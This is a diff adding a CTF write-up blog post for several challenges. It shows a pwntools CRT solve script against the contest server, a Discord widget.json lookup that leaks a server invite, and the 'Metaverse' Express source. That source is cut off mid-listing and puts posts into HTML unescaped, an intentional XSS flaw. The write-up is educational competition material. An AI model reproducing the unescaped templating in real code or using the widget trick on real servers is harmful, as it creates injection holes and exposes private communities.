+<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;I&#39;ll answer one modulus question, that&#39;s it.&#34;</span><span class=p>)</span>
+<span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;What do you want?&#34;</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;1: Ask for a modulus&#34;</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;2: Guess my number&#34;</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;3: Exit&#34;</span><span class=p>)</span>
+    <span class=n>response</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;&gt;&gt; &#34;</span><span class=p>)</span>
+
+    <span class=k>if</span> <span class=n>response</span> <span class=o>==</span> <span class=s2>&#34;1&#34;</span><span class=p>:</span>
+        <span class=k>if</span> <span class=n>used_oracle</span><span class=p>:</span>
+            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;too lazy&#34;</span><span class=p>)</span>
+            <span class=nb>print</span><span class=p>()</span>
+        <span class=k>else</span><span class=p>:</span>
+            <span class=n>modulus</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Type your modulus here: &#34;</span><span class=p>)</span>
+            <span class=n>modulus</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>modulus</span><span class=p>)</span>
+            <span class=k>if</span> <span class=n>modulus</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>:</span>
+                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;something positive pls&#34;</span><span class=p>)</span>
+                <span class=nb>print</span><span class=p>()</span>
+            <span class=k>else</span><span class=p>:</span>
+                <span class=n>used_oracle</span> <span class=o>=</span> <span class=kc>True</span>
+                <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=o>%</span><span class=n>modulus</span><span class=p>)</span>
+                <span class=nb>print</span><span class=p>()</span>
+    <span class=k>elif</span> <span class=n>response</span> <span class=o>==</span> <span class=s2>&#34;2&#34;</span><span class=p>:</span>
+        <span class=n>guess</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Type your guess here: &#34;</span><span class=p>)</span>
+        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>guess</span><span class=p>)</span> <span class=o>==</span> <span class=n>target</span><span class=p>:</span>
+            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+                <span class=nb>print</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>readline</span><span class=p>())</span>
+        <span class=k>else</span><span class=p>:</span>
+            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;nope&#34;</span><span class=p>)</span>
+        <span class=n>exit</span><span class=p>()</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;bye&#34;</span><span class=p>)</span>
+        <span class=n>exit</span><span class=p>()</span>
+</code></pre></div><p>To obtain the flag, you only have to make the modulus greater than the target <code>p*q</code> , then use that to get the flag.
+<img loading=lazy src=https://i.imgur.com/JC6yH9P.png alt>
+</p>
+<h2 id=chinese-lazy-theorem-2>chinese-lazy-theorem-2<a hidden class=anchor aria-hidden=true href=#chinese-lazy-theorem-2>#</a></h2>
+<p>If you can find <code>target % p</code> and <code>target % q</code> you find target <code>target % pq</code>. But since the maximum target is <code>p*q*2*3*5</code> it isn&rsquo;t quite enough for us, so we have to try <code>(target % pq) + i * pq </code> 30 times.</p>
+<p>I did so with the following script; please excuse its grotesqueness.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>    
+<span class=kn>from</span> <span class=nn>sympy.ntheory.modular</span> <span class=kn>import</span> <span class=n>crt</span>    
+    
+<span class=k>with</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;lac.tf&#34;</span><span class=p>,</span> <span class=mi>31111</span><span class=p>)</span> <span class=k>as</span> <span class=n>r</span><span class=p>:</span>    
+	<span class=n>p</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>readline</span><span class=p>(</span><span class=kc>False</span><span class=p>))</span>    
+	<span class=n>q</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>readline</span><span class=p>(</span><span class=kc>False</span><span class=p>))</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>readuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Type your modulus here: &#34;</span><span class=p>)</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>p</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>    
+	<span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>readline</span><span class=p>(</span><span class=kc>False</span><span class=p>))</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>readuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Type your modulus here: &#34;</span><span class=p>)</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>q</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>    
+	<span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>readline</span><span class=p>(</span><span class=kc>False</span><span class=p>))</span>    
+	<span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=n>crt</span><span class=p>([</span><span class=n>p</span><span class=p>,</span><span class=n>q</span><span class=p>],[</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>])</span>    
+	<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>    
+	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>30</span><span class=p>):</span>    
+		<span class=n>r</span><span class=o>.</span><span class=n>readuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Type your guess here: &#34;</span><span class=p>)</span>    
+		<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=o>+</span><span class=n>i</span><span class=o>*</span><span class=n>b</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>    
+		<span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>readline</span><span class=p>())</span>  
+</code></pre></div><p><img loading=lazy src=https://i.imgur.com/EiDhwBs.png alt>
+</p>
+<h2 id=discord-l34k>discord l34k<a hidden class=anchor aria-hidden=true href=#discord-l34k>#</a></h2>
+<p>This was probably my favorite challenge of the CTF. We are asked to gain access to a Discord server depicted in a picture of a widget, but the entire challenge was based on a link provided in the description.<br>
+<img loading=lazy src=https://i.imgur.com/E9r1Ahp.png alt>
+</p>
+<p>The link provided in the description: <code>https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186   </code></p>
+<p>After looking a bit into the Discord JSON API, I saw that the first ID provided in the link is that of the server, so using that first ID, I added it to the link used for widgets.<br>
+<a href=https://discordapp.com/api/servers/1060030874722259057/widget.json>https://discordapp.com/api/servers/1060030874722259057/widget.json</a><br>
+<img loading=lazy src=https://i.imgur.com/XVeWvUn.jpeg alt>
+</p>
+<p>This provided us with a discord link with the challenge flag.<br>
+<img loading=lazy src=https://i.imgur.com/otQZ9Ju.png alt>
+</p>
+<h2 id=metaverse>Metaverse<a hidden class=anchor aria-hidden=true href=#metaverse>#</a></h2>
+<p>I&rsquo;ll admit, I solved this one late. But it was solved, so that is all that matters.</p>
+<p>We are provided with <em>two</em> links:</p>
+<ul>
+<li><a href=https://metaverse.lac.tf/login>https://metaverse.lac.tf/login</a></li>
+<li><a href=https://admin-bot.lac.tf/metaverse>https://admin-bot.lac.tf/metaverse</a> (We can infer XSS since when these are provided, they usually are.)</li>
+</ul>
+<p>and a file <code>index.js</code></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;express&#34;</span><span class=p>);</span>  
+<span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;path&#34;</span><span class=p>);</span>  
+<span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;fs&#34;</span><span class=p>);</span>  
+<span class=kr>const</span> <span class=nx>cookieParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;cookie-parser&#34;</span><span class=p>);</span>  
+<span class=kr>const</span> <span class=p>{</span> <span class=nx>v4</span><span class=o>:</span> <span class=nx>uuid</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;uuid&#34;</span><span class=p>);</span>
+
+<span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FLAG</span><span class=p>;</span>  
+<span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=nb>parseInt</span><span class=p>(</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>PORT</span><span class=p>)</span> <span class=o>||</span> <span class=mi>8080</span><span class=p>;</span>  
+<span class=kr>const</span> <span class=nx>adminpw</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>ADMINPW</span> <span class=o>||</span> <span class=s2>&#34;placeholder&#34;</span><span class=p>;</span>
+
+<span class=kr>const</span> <span class=nx>accounts</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Map</span><span class=p>();</span>  
+<span class=nx>accounts</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=p>{</span>  
+    <span class=nx>password</span><span class=o>:</span> <span class=nx>adminpw</span><span class=p>,</span>  
+    <span class=nx>displayName</span><span class=o>:</span> <span class=nx>flag</span><span class=p>,</span>  
+    <span class=nx>posts</span><span class=o>:</span> <span class=p>[],</span>  
+    <span class=nx>friends</span><span class=o>:</span> <span class=p>[],</span>  
+<span class=p>});</span>  
+<span class=kr>const</span> <span class=nx>posts</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Map</span><span class=p>();</span>
+
+<span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
+
+<span class=kd>let</span> <span class=nx>cleanup</span> <span class=o>=</span> <span class=p>[];</span>
+
+<span class=nx>setInterval</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=kr>const</span> <span class=nx>now</span> <span class=o>=</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>  
+    <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>.</span><span class=nx>findIndex</span><span class=p>((</span><span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>now</span> <span class=o>&lt;</span> <span class=nx>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>i</span> <span class=o>===</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>i</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>  
+    <span class=p>}</span>  
+    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>i</span><span class=p>;</span> <span class=nx>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=kr>const</span> <span class=nx>account</span> <span class=o>=</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>cleanup</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>  
+        <span class=k>for</span> <span class=p>(</span><span class=kr>const</span> <span class=nx>post</span> <span class=k>of</span> <span class=nx>account</span><span class=p>.</span><span class=nx>posts</span><span class=p>)</span> <span class=p>{</span>  
+            <span class=nx>posts</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=nx>post</span><span class=p>);</span>  
+        <span class=p>}</span>  
+        <span class=nx>accounts</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=nx>cleanup</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>  
+    <span class=p>}</span>  
+    <span class=nx>cleanup</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>  
+<span class=p>},</span> <span class=mi>1000</span> <span class=o>*</span> <span class=mi>60</span><span class=p>);</span>
+
+<span class=kd>function</span> <span class=nx>needsAuth</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/login&#34;</span><span class=p>);</span>  
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=nx>next</span><span class=p>();</span>  
+    <span class=p>}</span>  
+<span class=p>}</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>cookieParser</span><span class=p>());</span>  
+<span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=nx>urlencoded</span><span class=p>({</span> <span class=nx>extended</span><span class=o>:</span> <span class=kc>false</span> <span class=p>}));</span>  
+<span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>login</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=kr>const</span> <span class=nx>chunks</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>login</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>);</span>  
+        <span class=k>if</span> <span class=p>(</span><span class=nx>chunks</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>2</span> <span class=o>&amp;&amp;</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>chunks</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>chunks</span><span class=p>[</span><span class=mi>0</span><span class=p>]).</span><span class=nx>password</span> <span class=o>===</span> <span class=nx>chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=p>{</span>  
+            <span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=nx>chunks</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>  
+        <span class=p>}</span>  
+    <span class=p>}</span>  
+    <span class=nx>next</span><span class=p>();</span>  
+<span class=p>});</span>
+
+<span class=c1>// templating engines are for losers!  
+</span><span class=c1></span><span class=kr>const</span> <span class=nx>postTemplate</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s2>&#34;post.html&#34;</span><span class=p>),</span> <span class=s2>&#34;utf8&#34;</span><span class=p>);</span>  
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/post/:id&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>posts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>))</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/html&#34;</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=nx>postTemplate</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s2>&#34;$CONTENT&#34;</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=nx>posts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>)));</span>  
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/html&#34;</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=nx>postTemplate</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s2>&#34;$CONTENT&#34;</span><span class=p>,</span> <span class=s2>&#34;post not found :(&#34;</span><span class=p>));</span>  
+    <span class=p>}</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=nx>needsAuth</span><span class=p>);</span>  
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/login&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>  
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=nx>next</span><span class=p>();</span>  
+    <span class=p>}</span>  
+<span class=p>});</span>  
+<span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=kr>static</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s2>&#34;static&#34;</span><span class=p>),</span> <span class=p>{</span> <span class=nx>extensions</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;html&#34;</span><span class=p>]</span> <span class=p>}));</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/register&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>username</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>password</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>displayName</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/login#&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=s2>&#34;Please metafill out all the metafields.&#34;</span><span class=p>));</span>  
+        <span class=k>return</span><span class=p>;</span>  
+    <span class=p>}</span>  
+    <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>username</span><span class=p>.</span><span class=nx>trim</span><span class=p>();</span>  
+    <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>password</span><span class=p>.</span><span class=nx>trim</span><span class=p>();</span>  
+    <span class=kr>const</span> <span class=nx>displayName</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>displayName</span><span class=p>.</span><span class=nx>trim</span><span class=p>();</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=sr>/^[\w]{3,32}$/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>username</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=sr>/^[-\w !@#$%^&amp;*()+]{3,32}$/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>password</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=sr>/^[-\w ]{3,64}/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>displayName</span><span class=p>))</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/login#&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=s2>&#34;Invalid metavalues provided for metafields.&#34;</span><span class=p>));</span>  
+        <span class=k>return</span><span class=p>;</span>  
+    <span class=p>}</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>accounts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>username</span><span class=p>))</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/login#&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=s2>&#34;Metaaccount already metaexists.&#34;</span><span class=p>));</span>  
+        <span class=k>return</span><span class=p>;</span>  
+    <span class=p>}</span>  
+    <span class=nx>accounts</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>username</span><span class=p>,</span> <span class=p>{</span> <span class=nx>password</span><span class=p>,</span> <span class=nx>displayName</span><span class=p>,</span> <span class=nx>posts</span><span class=o>:</span> <span class=p>[],</span> <span class=nx>friends</span><span class=o>:</span> <span class=p>[]</span> <span class=p>});</span>  
+    <span class=nx>cleanup</span><span class=p>.</span><span class=nx>push</span><span class=p>([</span><span class=nx>username</span><span class=p>,</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>+</span> <span class=mi>1000</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>12</span><span class=p>]);</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s2>&#34;login&#34;</span><span class=p>,</span> <span class=sb>`</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>:</span><span class=si>${</span><span class=nx>password</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span> <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/login&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>username</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>password</span> <span class=o>!==</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/login#&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=s2>&#34;Please metafill out all the metafields.&#34;</span><span class=p>));</span>  
+        <span class=k>return</span><span class=p>;</span>  
+    <span class=p>}</span>  
+    <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>username</span><span class=p>.</span><span class=nx>trim</span><span class=p>();</span>  
+    <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>password</span><span class=p>.</span><span class=nx>trim</span><span class=p>();</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=nx>accounts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>username</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>accounts</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>username</span><span class=p>).</span><span class=nx>password</span> <span class=o>===</span> <span class=nx>password</span><span class=p>)</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s2>&#34;login&#34;</span><span class=p>,</span> <span class=sb>`</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>:</span><span class=si>${</span><span class=nx>password</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span> <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>  
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&#34;/login#&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=s2>&#34;Wrong metausername/metapassword.&#34;</span><span class=p>));</span>  
+    <span class=p>}</span>  
+<span class=p>});</span>
+
+<span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s2>&#34;/friend&#34;</span><span class=p>,</span> <span class=nx>needsAuth</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>  
+    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;text/plain&#34;</span><span class=p>);</span>  
+    <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>username</span><span class=p>.</span><span class=nx>trim</span><span class=p>();</span>  
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>accounts</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>username</span><span class=p>))</span> <span class=p>{</span>  
+        <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Metauser doesn&#39;t metaexist&#34;</span><span class=p>);</span>  
